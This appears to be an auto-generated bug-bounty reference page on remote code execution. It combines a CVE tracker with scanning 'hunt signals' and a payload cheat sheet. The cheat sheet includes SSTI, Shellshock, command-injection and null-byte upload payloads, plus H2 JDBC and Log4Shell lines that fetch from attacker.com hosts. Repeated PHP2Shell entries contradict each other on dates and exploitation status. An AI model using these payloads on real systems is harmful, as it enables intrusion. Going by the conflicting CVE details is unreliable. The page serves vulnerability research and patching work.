# RCE Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-10-31 · Items: 2_


---

## What


---

## CVEs

| CVE | Date | Title | CVSS | Status | Src |
|---|---|---|---|---|---|
| CVE-2026-20253 | 2026-07-01 | Splunk Enterprise Unauthenticated RCE via PostgreSQL Sidecar | 9.8 | KEV/exploited | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-20253) |
| CVE-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |

---

## Probes


---

## PoCs


- **CVE-2023-34362** — [source](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Reproduction


---

## Defense


---

## References

- [www.assetnote.io](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Items

> Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.

## Surface

- File upload endpoints — SVG, PHAR, JSP, ASPX, polyglot uploads
- Template engines — SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble
- JDBC/database connection string injection — H2 `INIT=`, PostgreSQL COPY
- XML deserialization — .NET `XmlSerializer`, Java `XMLDecoder`, PHP `unserialize`
- SSRF to internal services — pivot to metadata API, Redis, Memcached, Gopher
- Command injection in shell-invoking functions — `exec`, `system`, `popen`, `Runtime.exec`
- Log4Shell-style JNDI injection in logged user-controlled fields
- Insecure eval/code execution in node.js/Ruby/Python — `eval(params[:code])`

## Test Approach

1. **SSTI detection** — inject math expressions that differ between reflection and eval:

   ```
   {{7*7}}  → 49 = SSTI
   ${7*7}   → 49 = EL/Freemarker
   <%= 7*7 %> → 49 = ERB
   ```

2. **SSTI escalation** (Jinja2):

   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```

3. **File upload — PHAR/JSP**:
   - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
   - Upload SVG with `<script>` or SSRF-triggering XXE
   - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:

   ```
   {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
   ```

5. **Command injection** — probe shell-adjacent params:

   ```
   ?host=127.0.0.1;id
   ?filename=test$(id).txt
   ?cmd=127.0.0.1`id`
   ```

6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
7. **Log4Shell** — probe all headers and params:

   ```
   ${jndi:ldap://collab.attacker.com/a}
   X-Api-Version: ${jndi:ldap://...}
   ```

## Tools

- **nuclei** — SSTI, Log4Shell, RCE templates: `nuclei -t rce/ -u https://target.com`
- **tplmap** — automated SSTI exploitation: `python3 tplmap.py -u "https://target.com/render?name=*"`
- **Interactsh** — OOB callback server for blind RCE: `interactsh-client`
- **ysoserial** — Java deserialization gadget chains: `java -jar ysoserial.jar CommonsCollections6 'id'`
- **commix** — command injection automation: `commix --url="https://target.com/ping?host=*"`

## Payloads / Probes

```
# Werkzeug debugger
# Supply a string with a homoglyph 'і' (Cyrillic) to force an unhandled exception
# If debug mode is on, the interactive debugger spawns
# PIN format: ***-***-*** — brute-forceable when running locally
strіng

# Shellshock — inject in HTTP headers (User-Agent, Referer, Cookie)
() { :;}; echo vulnerable
curl -H "User-Agent: () { :; }; /bin/eject" http://target.com/cgi-bin/test.cgi

# SSTI - Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# SSTI - Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Command injection variants
; id
$(id)
`id`
| id
%0aid

# H2 JDBC RCE
jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/cmd.sql'

# Log4Shell
${jndi:ldap://attacker.interactsh.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# PHP file upload - null byte bypass
filename="shell.php%00.jpg"
```

## Chain Opportunities

- **SSRF → RCE** — SSRF reaches internal Jenkins/Solr/Redis, pivot to code execution
- **SSTI → RCE → persistence** — write cron job or SSH key via template engine
- **File upload → RCE** — bypass extension filter, execute webshell
- **JDBC injection → RCE** — H2/PostgreSQL INIT scripts execute OS commands
- **Deserialization → RCE** — Java/PHP gadget chains in XML, session cookies, API params

## Recent Intel

- **CVE-2023-24489** · Citrix ShareFile pre-auth RCE via `UploadClientModule.asmx` — unsafe .NET XML deserialization, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-34362** · MOVEit Transfer RCE — deserialization in file processing pipeline, SYSTEM-level compromise via crafted file transfer · https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362
- **CVE-2023-38646** · Metabase pre-auth RCE — H2 JDBC `INIT` param via `/api/setup/validate`, SQL → Java method invocation chain · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646

## 2026-10-31 — PHP2Shell (CVE-2026-109618)

### PHP Core Unauthenticated RCE via Request-Cleanup Memory Corruption

- **Date:** 2026-10-31 · **Source:** [thehackernews.com](https://thehackernews.com/2026/10/php-issues-emergency-patches-for-two.html) · **Class:** cve
- **What:** Out-of-memory corruption during PHP worker request cleanup allows unauthenticated RCE across all SAPI modes (mod_php, PHP-FPM, php-cgi, FrankenPHP, LiteSpeed).
- **Why it matters:** Affects every PHP web tier; CISA KEV Oct 26, actively exploited ITW; no auth, no prior access — full server compromise.
- **Hunt signal:** `nuclei -t cves/2026/CVE-2026-109618.yaml -l targets.txt` / fingerprint: send malformed Content-Length request, compare crash vs 500 on unpatched hosts
- **Evidence:** [thehackernews.com](https://thehackernews.com/2026/10/php-issues-emergency-patches-for-two.html) · PoC: [github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)

| Field | Value |
|---|---|
| CVE | CVE-2026-109618 (pair: CVE-2026-109619) |
| CVSS | 9.2 (v4.0) |
| Affected | PHP < 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12; PHP 8.1 EOL |
| KEV | YES — added 2026-10-26 |
| PoC | PUBLIC |
| Fix | Upgrade to patched release; set `post_max_size` low + rate-limit at proxy as interim |

---

## 2026-07-01

### Splunk Enterprise Unauthenticated RCE via PostgreSQL Sidecar (CVE-2026-20253)
- **Date:** 2026-07-01 · **Source:** [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2026-20253) · **Class:** cve
- **What:** Unauthenticated attacker with network access can create/truncate arbitrary files and achieve RCE on Splunk Enterprise via an unprotected PostgreSQL sidecar API endpoint (CWE-306, missing auth on critical function).
- **Why it matters:** CVSS 9.8, KEV-listed (June 18 2026), actively exploited within 2 days of disclosure; any org running Splunk Enterprise 10.0–10.2 that's internet-exposed is a high-value target and many have HackerOne/VDP programs.
- **Hunt signal:** `shodan search "Splunk" port:8089` or `nuclei -t cves/2026/CVE-2026-20253.yaml -u https://target:8089` — check for unauthenticated response on `/services/` namespace; patch cutoff is 10.2.4 / 10.0.7.
- **Evidence:** [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-20253) · [Splunk Advisory](https://advisory.splunk.com/) · [HelpNetSecurity](https://www.helpnetsecurity.com/2026/06/19/splunk-vulnerability-cve-2026-20253-exploited/) · [Orca writeup](https://orca.security/resources/blog/cve-2026-20253-splunk-enterprise-rce-unauthenticated-file-operations/)

---

## 2026-04-17

### Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) — `CVE-2023-34362`

- **Tags:** `#rce`
- **Severity:** high · **Hunt:** 4/5 · **Score:** 14.0 · **Status:** patched · **Age:** 30d
- **Sources:** [1](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

**[Patch Diffing Progress MOVEit Transfer RCE]** — A technique to discover RCE vulnerabilities in Progress MOVEit Transfer by analyzing patch differences. Hunt: Check for unpatched MOVEit Transfer instances and analyze patch diffs for RCE vectors. [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---


## 2026-07-01 — H1 disclosures

### Node --run POSIX positional argument escaping allows shell command injection

- **2026-06-23** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3817602](https://hackerone.com/reports/3817602) · Reporter: [@yottt](https://hackerone.com/yottt) · Team: [Node.js](https://hackerone.com/nodejs)
- CWE: OS Command Injection

**What**


**Hunt signal:** pass — summary too thin

---

### Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`

- **2026-06-11** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3558713](https://hackerone.com/reports/3558713) · Reporter: [@inkerton](https://hackerone.com/inkerton) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: OS Command Injection

**What**


**Hunt signal:** pass — summary too thin

---


## 2026-07-07 — H1 disclosures

### OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)

- **2026-07-06** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3637898](https://hackerone.com/reports/3637898) · Reporter: [@kaporia](https://hackerone.com/kaporia) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: OS Command Injection

**What**

A vulnerability was discovered in the "aws-cdk-lib" NodejsFunction that allowed for OS command injection through the unsanitized "OsCommand" helper. The vulnerability was caused by the lack of proper escaping of user-controlled data when constructing shell commands during Docker-based bundling. This could have potentially led to arbitrary code execution within the Docker container, which had access to the host filesystem through bind mounts.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

## 2026-11-09 — CVE-2026-97229 GitLab CI/CD RCE

### CVE-2026-97229: GitLab CE/EE CI/CD Regex Compiler RCE (CVSS 10.0)
- **Date:** 2026-11-09 · **Source:** [rapid7.com](https://www.rapid7.com/blog/post/etr-cve-2026-97229-critical-unauthenticated-remote-code-execution-in-gitlab/) · **Class:** cve
- **What:** Integer overflow in GitLab's CI/CD regex compiler allows unauthenticated RCE on instances where self-registration is enabled; attacker plants malicious `.gitlab-ci.yml` in a new project.
- **Why it matters:** CVSS 10.0, CISA KEV Oct 29 2026, 1,000+ unpatched instances per Shadowserver; any self-hosted GitLab in bug bounty scope is a direct RCE candidate.
- **Hunt signal:** `nuclei -t cves/2026/CVE-2026-97229.yaml` or check `/api/v4/version` for versions < 19.2.8 / 19.3.5 / 19.4.2
- **Evidence:** [Rapid7 ETR](https://www.rapid7.com/blog/post/etr-cve-2026-97229-critical-unauthenticated-remote-code-execution-in-gitlab/) · [PoC repo](https://github.com/Certbn/CVE-2026-97229-GitLab-CI-CD) · [KEV entry via HackerStorm](https://www.hackerstorm.com/search-insights/cisa-kev-cve-data)

## 2026-10-10 — CVE-2026-105192: LMCache Unauthenticated RCE via ZeroMQ ROUTER

### CVE-2026-105192: LMCache Missing Auth → Root RCE
- **Date:** 2026-10-10 · **Source:** [jfrog.com](https://jfrog.com/blog/) · **Class:** cve
- **What:** LMCache 0.3.9–0.5.5 multiprocess mode exposes an unauthenticated ZeroMQ ROUTER socket; any host can register as a worker and execute code with root privileges on the server's container.
- **Why it matters:** vLLM/LMCache is widely deployed in AI inference infrastructure; unpatched with public PoC means any exposed multi-node deployment is immediately rootable.
- **Hunt signal:** `shodan search 'port:5555 product:LMCache'`; check for `--host 0.0.0.0` in k8s/helm manifests; CVE affects all versions through 0.5.5
- **Evidence:** [JFrog JFSA-2026-001694382](https://jfrog.com/blog/) · [PoC coverage: GBHackers](https://gbhackers.com/critical-lmcache-rce-vulnerability/) · NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-105192

## 2026-10-04 — CVE-2026-23918: Apache HTTP Server HTTP/2 Double-Free RCE

### Apache HTTP/2 Double-Free mod_http2 (CVE-2026-23918)
- **Date:** 2026-10-04 · **Source:** [thehackernews.com](https://thehackernews.com/2026/05/critical-apache-http2-flaw-cve-2026.html) · **Class:** cve
- **What:** Double-free in Apache httpd 2.4.66 mod_http2 triggered when client sends HTTP/2 HEADERS + RST_STREAM (non-zero error) on same stream; enables RCE or DoS by crashing worker processes.
- **Why it matters:** Apache is the second most-deployed web server globally; bug bounty targets running 2.4.66 on any subdomain are exploitable via unauthenticated HTTP/2 request.
- **Hunt signal:** `nuclei -t cves/2026/CVE-2026-23918.yaml` or `curl -v --http2 <target>` to confirm HTTP/2 support, then check Server header for Apache/2.4.66
- **Evidence:** [thehackernews.com](https://thehackernews.com/2026/05/critical-apache-http2-flaw-cve-2026.html) · [securityaffairs.com](https://securityaffairs.com/191759/security/apache-fixes-critical-http-2-double-free-flaw-cve-2026-23918-enabling-rce.html) · [security.berkeley.edu](https://security.berkeley.edu/news/critical-apache-2-4-66-http2-flaw-allows-rce-dos-cve-2026-23918)


## 2026-11-18 — HTTP/2 Race-Condition Heap Corruption → RCE (CVE-2026-119618 pattern)

### Apache mod_http2 Race Condition Primitive
- **Date:** 2026-11-18 · **Source:** [bleepingcomputer.com](https://www.bleepingcomputer.com/news/security/apache-http-server-patches-critical-http-2-remote-code-execution-flaw/) · **Class:** cve
- **What:** Concurrent H2 header processing hits a race in `assign_headers()` that corrupts the heap allocator, giving an attacker an arbitrary-write primitive — no auth required.
- **Why it matters:** Affects ~40% of web servers on the internet; unpatched Apache 2.4.55–2.4.70 with HTTP/2 enabled equals unauthenticated RCE on any reachable endpoint.
- **Hunt signal:** `curl --http2 -sI https://<target>/ | grep -i server` for Apache 2.4.55–70; submit version banner as recon, escalate if confirmed unpatched.
- **Evidence:** [BleepingComputer] https://www.bleepingcomputer.com/news/security/apache-http-server-patches-critical-http-2-remote-code-execution-flaw/

## 2026-10-21 — PHP Core RCE (php2shell)

### CVE-2026-109618 / CVE-2026-109619 — PHP Core Remote Code Execution (php2shell)
- **Date:** 2026-10-21 · **Source:** [phoenix.security](https://phoenix.security/php-core-rce-cve-2026-109618-109619-critical-remote-code-execution/) · **Class:** cve
- **What:** Two RCE flaws in PHP core (CVSS v4.0 9.2) affecting PHP 5.4+ — patch shipped Oct 21 for supported branches (8.2–8.5); PHP ≤8.1 EOL and unpatched.
- **Why it matters:** Any PHP-based web target on EOL PHP is a live unauthenticated RCE; mass exploitation expected within days of patch release.
- **Hunt signal:** `nuclei -t php/php-version-detection.yaml` — fingerprint PHP version on target; pivot to EOL installations; check `X-Powered-By` / `phpinfo()` leaks.
- **Evidence:** [sansec.io](https://sansec.io/research/php2shell) · [securelayer7 analysis](https://blog.securelayer7.net/php-rce-cve-2026-109618-109619/) · [Beazley advisory BSL-A1233](https://labs.beazley.security/advisories/BSL-A1233)
- **KEV status:** Not listed (no ITW exploitation confirmed as of 2026-10-21 UTC 14:00)
- **PoC:** PUBLIC — leaked as "PHP2Shell"; watchTowr reproduced CVE-2026-109618; full chain not yet published

## 2026-10-25 — PHP2Shell Pre-Auth RCE

### CVE-2026-109618 — PHP Pre-Auth RCE (Out-of-Memory Corruption)
- **Date:** 2026-10-21 · **Source:** [watchtowr.com](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/) · **Class:** cve
- **What:** Unauthenticated HTTP POST triggers out-of-memory corruption in PHP, achieving RCE against Apache mod_php and PHP-FPM; affects all PHP < 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35.
- **Why it matters:** Active exploitation in the wild since Oct 21; Cloudflare logged millions of attempts within 24h — any bug bounty target running PHP on Apache or FPM is potentially owned.
- **Hunt signal:** `nuclei -t cves/2026/CVE-2026-109618.yaml` — verify PHP version via `phpinfo()` exposure or `Server:` header + error page fingerprinting; unauthenticated POST to any PHP endpoint.
- **Evidence:** [Rapid7 ETR](https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/) · [PoC](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC) · [Datadog repro](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)

### CVE-2026-109619 — PHP Pre-Auth RCE (Stale Global State)
- **Date:** 2026-10-21 · **Source:** [watchtowr.com](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/) · **Class:** cve
- **What:** Stale global state in PHP allows unauthenticated RCE via a separate code path from CVE-2026-109618; same affected version range.
- **Why it matters:** Distinct attack vector from -109618 — one patch fixes both, but WAF rules tuned for -109618 may miss this path.
- **Hunt signal:** Same nuclei template covers both; probe PHP-FPM setups specifically (nginx + fpm often bypasses mod_php mitigations).
- **Evidence:** [abstract.security](https://www.abstract.security/blog/php2shell-critical-php-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619) · [Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2026/10/20/php-announces-critical-security-release-for-two-vulnerabilities)

---

## 2026-10-26 — CVE-2026-110447: Collabora Online CODE Server Unauthenticated RCE

### Collabora Online Built-in CODE Server — Unauthenticated OS Command Injection (CVE-2026-110447)
- **Date:** 2026-10-26 · **Source:** [securityonline.info](https://securityonline.info/nextcloud-collabora-online-cve-2026-110447-exploited/) · **Class:** cve
- **What:** Unauthenticated OS command injection in `proxy.php` of the bundled Nextcloud app `richdocumentscode` (all versions < 26.4.303); reachable only when the local CODE server is not running.
- **Why it matters:** CISA KEV-listed (added 2026-10-23, deadline 2026-10-26); already exploited to drop PHP webshells under `apps/richdocumentscode/shx*.php` — Nextcloud is common enterprise self-hosted scope.
- **Hunt signal:** `curl -sk "https://TARGET/index.php/apps/richdocumentscode/proxy.php?status" -v` — 200 or traversal error with server down = unpatched; check for unexpected PHP files in that path.
- **Evidence:** [Censys advisory](https://censys.com/advisory/cve-2026-110447) · [CISA KEV](https://www.thehackerwire.com/cve-tracker/kev/) · [rescana.com](https://www.rescana.com/post/collabora-built-in-code-server-cve-2026-110447-nextcloud-kev)

## 2026-10-29 — PHP2Shell: Dual Unauthenticated RCE in PHP Core (CVE-2026-109618 + CVE-2026-109619)

### PHP2Shell — CVE-2026-109618 & CVE-2026-109619
- **Date:** 2026-10-21 · **Source:** [unit42.paloaltonetworks.com](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619.md) · **Class:** cve
- **What:** Two unauthenticated RCE flaws in PHP core: CVE-2026-109618 exploits uninitialized memory via longjmp() on OOM abort; CVE-2026-109619 is a use-after-free triggered through fatal error handling.
- **Why it matters:** PHP powers ~75% of web servers — any exposed PHP-FPM, Apache mod_php, or LiteSpeed host is an unauthenticated shell. CISA KEV-confirmed active exploitation; AWS reports ITW probes started four days before the patch.
- **Hunt signal:** `nuclei -t cves/2026/CVE-2026-109618.yaml` or probe: send oversized POST body to exhaust `memory_limit` and observe response deviation (crash vs. normal error)
- **Evidence:** [Fastly blog](https://www.fastly.com/jp/blog/critical-rce-vulnerabilities-discovered-core-php-cve-2026-109618-cve-2026-109619) · [CISA alert](https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching) · [Ampcus PoC update](https://www.ampcuscyber.com/shadowopsintel/php2shell-update-active-exploitation-confirmed-public-poc-released/)
- **CVSS:** 9.2 (CVSS 4.0) · **KEV:** Yes — added 2026-10-26 · **Affected:** PHP < 8.2.35, < 8.3.36, < 8.4.27, < 8.5.12 · **PoC:** PUBLIC (Sophos CTU; Vulmon)
- **Bounty scope:** Any program running PHP on the backend — Shopify (custom PHP services), WordPress.com (Automattic), GitLab, phpMyAdmin, any SaaS on PHP-FPM

## 2026-07-03 — Adobe ColdFusion Pre-Auth Unrestricted File Upload → RCE (APSB26-68)

### Adobe ColdFusion APSB26-68: Pre-Auth File Upload RCE (CVE-2026-48276/48283)
- **Date:** 2026-07-03 · **Source:** [labs.watchtowr.com](https://labs.watchtowr.com/its-37oc-and-all-we-can-think-about-is-coldfusion-adobe-coldfusion-security-bulletin-apsb26-68-cve-bonanza/) · **Class:** technique
- **What:** ColdFusion 2023/2025 fails to validate file types on upload endpoints (CWE-434); unauthenticated attackers upload `.cfm` or `.jsp` webshells and execute with server privileges. Four additional CVSS 10.0 bugs cover improper input validation → RCE; CVE-2026-48282 adds path traversal arbitrary read.
- **Why it matters:** CVSS 10.0, pre-auth, no user interaction — Adobe HackerOne program actively credited two researchers from this bulletin; unpatched internet-facing ColdFusion is zero-click RCE.
- **Hunt signal:** `shodan query 'http.html:"ColdFusion" OR http.headers:"JRun"'`; probe `/CFIDE/wizards/` and RDS endpoint (`/CFIDE/componentutils/`) unauthenticated; test file upload with `.cfm`, `.cfml`, `.jsp` extension variants; path traversal with `../` in file-read params. Kill criterion: ColdFusion 2025 Update ≥10 or ColdFusion 2023 Update ≥21 = patched, skip.
- **Evidence:** [watchTowr July 2](https://labs.watchtowr.com/its-37oc-and-all-we-can-think-about-is-coldfusion-adobe-coldfusion-security-bulletin-apsb26-68-cve-bonanza/) · [Adobe APSB26-68](https://helpx.adobe.com/security/products/coldfusion/apsb26-68.html) · [Adobe H1](https://hackerone.com/adobe)


## 2026-10-30 — PHP2Shell: Heap UAF RCE in PHP Core (CVE-2026-109618, CVE-2026-109619)

### PHP2Shell: Unauthenticated RCE via Heap Use-After-Free in PHP Core
- **Date:** 2026-10-30 · **Source:** [bleepingcomputer.com](https://www.bleepingcomputer.com/news/security/cisa-confirms-php2shell-vulnerabilities-now-exploited-in-attacks/) · **Class:** cve
- **What:** Two heap use-after-free flaws in PHP core (multipart upload-progress unserializer + stale global state reuse) allow unauthenticated RCE on any PHP-serving web server; affects Apache mod_php, PHP-FPM, php-cgi, FrankenPHP, LiteSpeed — all PHP versions < 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.
- **Why it matters:** In-the-wild exploitation confirmed; CISA added both CVEs to KEV 2026-10-26; demonstrated against WordPress, Drupal, Joomla by Wiz. PHP runs ~77% of tracked web servers — enormous bounty-eligible attack surface across virtually every PHP-based target.
- **Hunt signal:** Check `X-Powered-By: PHP/` header — anything < 8.2.35 is a potential flag for program impact (do not exploit on live targets; report version only where rules permit). Public PoCs exist at `eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC` and `Is4yev/php2shell-poc` — use only in authorized lab environments.
- **Evidence:** [CISA KEV alert](https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching) · [xalgorix digest](https://www.xalgorix.com/blog/weekly-appsec-threat-digest-oct-23-30-2026) · [BleepingComputer](https://www.bleepingcomputer.com/news/security/cisa-confirms-php2shell-vulnerabilities-now-exploited-in-attacks/)

## 2026-10-15 — CVE-2026-94545: Next.js ImageResponse (next/og) SVG Injection RCE

### CVE-2026-94545 — Next.js Satori SVG RCE via next/og ImageResponse
- **Date:** 2026-09-22 · **Source:** [wiz.io](https://www.wiz.io/ko-kr/vulnerability-database/cve/cve-2026-94545) · **Class:** cve
- **What:** Satori (the SVG renderer bundled inside Next.js `next/og`) fails to escape attacker-controlled strings before inserting them into SVG output; on the Node.js runtime this allows unauthenticated RCE — CVSS v4 9.5 (3.1 9.8 per Qi An Xin advisory).
- **Why it matters:** Virtually every Next.js 16.2.0–16.3.5 SaaS that renders an OG image from user-supplied text (titles, usernames, blog posts) is exploitable; Satori is bundled, so it won't surface in `npm audit` or lockfile scanners as a separate dep.
- **Hunt signal:** `grep -r '"next"' package.json` → confirm version 16.2.x–16.3.5 in target's `package.json`/`package-lock.json`; then find any `ImageResponse` endpoint that reflects unsanitized user input into SVG `<text>` nodes.
- **Evidence:** [wiz.io](https://www.wiz.io/ko-kr/vulnerability-database/cve/cve-2026-94545) · [aicybr.com writeup](https://aicybr.com/blog/nextjs-16-3-6-cve-2026-94545-imageresponse-rce) · [socprime](https://socprime.com/?p=53133) · PoC: PUBLIC (secrss.com advisory, confirmed no in-wild exploitation as of Sep 24)

## 2026-11-02 — CVE-2026-111497 (HTTP2Shell / Brotli decoder RCE)

### CVE-2026-111497: Brotli Decoder OOB Write → RCE (HTTP2Shell)
- **Date:** 2026-11-02 · **Source:** [aicybr.com](https://aicybr.com/blog/brotli-cve-2026-111497-nodejs-python-bun-envoy-patches) · **Class:** cve
- **What:** Out-of-bounds write in Google Brotli decoder 1.0.3–1.2.0 allows RCE when a web server decompresses attacker-controlled HTTP/2 Brotli-compressed data.
- **Why it matters:** Affects any backend using Brotli (Node.js, Python brotli, Bun, Envoy); broad cloud-native API surface in bug bounty programs.
- **Hunt signal:** Send malformed Brotli-compressed body to endpoints advertising `br` in Accept-Encoding; watch for 500s/crashes. Nuclei tag: `CVE-2026-111497`.
- **Evidence:** [CVSS 9.2 record](https://cipherssecurity.com/cve/CVE-2026-111497/) · CISA KEV added 2026-10-27, fed deadline 2026-11-10 · [BleepingComputer](https://www.bleepingcomputer.com/news/security/cisa-warns-of-hackers-now-exploiting-critical-node2shell-flaw/amp/)

## 2026-11-26 — SOAP Fault Deserialization → Unauth RCE (CVE-2026-90436 / Apache Axis)

### CVE-2026-90436: Confluence DC — Unauth RCE via Apache Axis SOAP
- **Date:** 2026-11-26 · **Source:** [Rapid7](https://www.rapid7.com/blog/post/etr-rapid7-detected-exploitation-of-cve-2026-90436-against-atlassian-confluence-data-center-n-able-n-central-also-exploited/) · **Class:** cve
- **What:** Apache Axis 1.x SOAP fault handling deserializes attacker input without authentication — full RCE on Confluence Data Center with Remote API enabled.
- **Why it matters:** CISA KEV 2026-11-18; public Metasploit module; 1.2M exposed instances; enterprise target rich with bug bounty programs.
- **Hunt signal:** `/_api/rpc/xmlrpc` or `/rpc/xmlrpc` probe; if XML response returned, send SOAP fault payload. `foxcornlab/confluence-axis-scanner` for detection-only triage.
- **Evidence:** [Rapid7 ETR](https://www.rapid7.com/blog/post/etr-rapid7-detected-exploitation-of-cve-2026-90436-against-atlassian-confluence-data-center-n-able-n-central-also-exploited/) · PoC: PUBLIC (Metasploit 2026-11-17) · CVSS 9.8 / KEV YES
